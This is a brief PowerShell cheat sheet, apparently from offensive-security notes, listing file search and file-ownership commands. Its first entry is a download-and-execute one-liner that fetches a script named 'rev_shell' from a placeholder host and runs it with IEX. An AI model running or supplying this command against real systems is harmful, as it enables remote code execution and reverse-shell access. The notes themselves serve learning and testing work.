# Powershell

## Usage

Download and execute file using powershell:

	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'

Search for files

	Get-ChildItem -force -Path "C:\Path\To\Search" -Recurse -Filter "filename*"

Show owners of files and dirs

	cmd.exe /c "dir /q"
	get-acl -Path <path_to_file_or_dir>